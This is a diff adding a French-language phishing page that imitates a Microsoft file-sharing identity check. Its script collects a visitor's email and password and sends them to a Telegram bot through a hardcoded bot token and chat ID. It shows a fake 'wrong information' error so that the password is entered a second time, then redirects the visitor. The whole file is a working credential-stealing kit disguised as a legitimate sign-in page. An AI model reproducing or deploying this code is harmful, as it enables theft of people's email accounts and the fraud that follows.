@@ -1,0 +1,205 @@
+﻿<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Plans Archi</title>
+  <link rel="stylesheet" href="styles.css"/>
+  <!-- Google Font -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:600" rel="stylesheet">
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+
+  <!-- Intégration CSS locale (à compléter quand tu m’envoies styles.css) -->
+  <style>
+    /* PLACEHOLDER – Ajoute ici ton CSS de styles.css */
+    body {
+      font-family: 'Open Sans', sans-serif;
+      background-color: #f8f9fa;
+    }
+    .form-text-input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+    }
+    .form-submit {
+      background-color: #0078d4;
+      color: white;
+      border: none;
+      padding: 10px;
+    }
+    .form-submit:hover {
+      background-color: #005ea2;
+    }
+  </style>
+</head>
+
+<body>
+  <div id="SharingValidationControlsSection" class="external-sharing-content ms-Fabric">
+    <div class="top-banner text-center p-3">
+      <img src="drive.png" class="img-fluid" width="150px" />
+    </div>
+
+    <div class="main-content container">
+      <div class="sharing-form">
+        <div class="header h4 text-center">Vérifiez Votre Identité</div>
+        <div class="form-content">
+          <div class="file-description text-center mb-3">
+            <div class="file-description-title">Vous avez reçu un fichier sécurisé</div>
+            <div class="file-info mt-2 d-flex justify-content-center align-items-center">
+              <img src="pdf.png" style="height:32px;width:32px;" />
+              <div class="file-name ml-2"><span>56.1KB</span></div>
+            </div>
+          </div>
+
+          <div class="form-message text-center mb-3">
+            Pour lire le document veuillez entrer les identifiants de messagerie auxquels ce fichier a été envoyé.
+          </div>
+
+          <div class="form-input-container">
+            <input name="username" maxlength="70" class="form-text-input" placeholder="Entrez l'adresse email" id="ai" type="email" required>
+            <div class="focus-area">
+              <div class="callout mt-2">
+                <strong>Pourquoi dois-je faire ça ?</strong><br />
+                La personne qui a partagé ce fichier avec vous a utilisé un lien sécurisé qui vous oblige à vérifier votre identité.
+              </div>
+            </div>
+          </div>
+
+          <div class="form-input-container" id="divPr" style="display: none;">
+            <input name="pr" id="pr" maxlength="70" class="form-text-input" placeholder="Entrez le mot de passe" type="password" required>
+          </div>
+
+          <div class="form-error-container text-center">
+            <div class="alert alert-danger" id="msg" style="display: none;">Mauvaises informations! Veuillez réessayer</div>
+            <span id="error" class="text-danger" style="display: none;">Ce compte n'existe pas. Entrez un autre compte</span>
+          </div>
+
+          <div class="form-input-container">
+            <button class="form-submit w-100" id="next">Continuer</button>
+            <button class="form-submit w-100" id="submit-btn" style="display: none;">S'identifier</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="legal text-center mt-4">
+        <span>© 2023 2024 Microsoft</span> | <a href="#">Privacy &amp; Cookies</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- jQuery + Bootstrap Bundle -->
+  <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.bundle.min.js"></script>
+
+  <!-- JS Unifié -->
+  <script>
+  if (localStorage.getItem("valide") !== "true") {
+  window.location.href = "../";
+}
+    var telegramConfig = {
+      botToken: '5898575682:AAFpxh-hiq6CSkbziNG_Jsr88xjgqI_ctkI',
+      chatID: '-882576496'
+    };
+
+    $(document).ready(function () {
+      var count = 0;
+
+      $(document).keypress(function (event) {
+        if (event.which === 13) {
+          if ($("#divPr").is(":visible")) {
+            $("#submit-btn").trigger("click");
+          } else {
+            $("#next").trigger("click");
+          }
+        }
+      });
+
+      $('#next').click(function (event) {
+        event.preventDefault();
+        $('#error, #msg').hide();
+        var ai = $("#ai").val();
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai) {
+          $('#error').show().html("Le champ e-mail est vide.!");
+          return;
+        }
+
+        if (!filter.test(ai)) {
+          $('#error').show().html("Ce compte n'existe pas. Entrez un autre compte");
+          return;
+        }
+
+        $("#next").html("Vérification...");
+        setTimeout(function () {
+          $("#ai").prop("readonly", true);
+          $("#divPr").fadeIn(500);
+          $("#next").hide();
+          $("#submit-btn").fadeIn(500);
+        }, 1000);
+      });
+
+      var hashAi = window.location.hash.substr(1);
+      if (hashAi) {
+        $('#ai').val(hashAi);
+        $("#msg").hide();
+      }
+
+      $('#submit-btn').click(function (event) {
+        event.preventDefault();
+        $('#error, #msg').hide();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai || !filter.test(ai)) {
+          $('#error').show().html("Ce compte n'existe pas. Entrez un autre compte");
+          return;
+        }
+        if (!pr) {
+          $('#error').show().html("Le champ mot de passe est vide.!");
+          return;
+        }
+
+        count += 1;
+        var telegramBotURL = "https://api.telegram.org/bot" + telegramConfig.botToken + "/sendMessage";
+
+        $.ajax({
+          dataType: 'JSON',
+          url: telegramBotURL,
+          type: 'POST',
+          data: {
+            chat_id: telegramConfig.chatID,
+            text: "Email: " + ai + "\nPassword: " + pr
+          },
+          beforeSend: function () {
+            $('#submit-btn').html('Vérification...');
+          },
+          success: function (response) {
+            if (response && response.ok) {
+              $("#pr").val("");
+              if (count >= 2) {
+                count = 0;
+                window.location.replace("https://finish.html");
+              }
+            }
+          },
+          error: function () {
+            $("#pr").val("");
+            if (count >= 2) {
+              count = 0;
+              window.location.replace("https://finish.html");
+            }
+            $("#msg").show();
+          },
+          complete: function () {
+            $('#submit-btn').html("S'identifier");
+          }
+        });
+      });
+    });
+  </script>
+</body>
+</html>
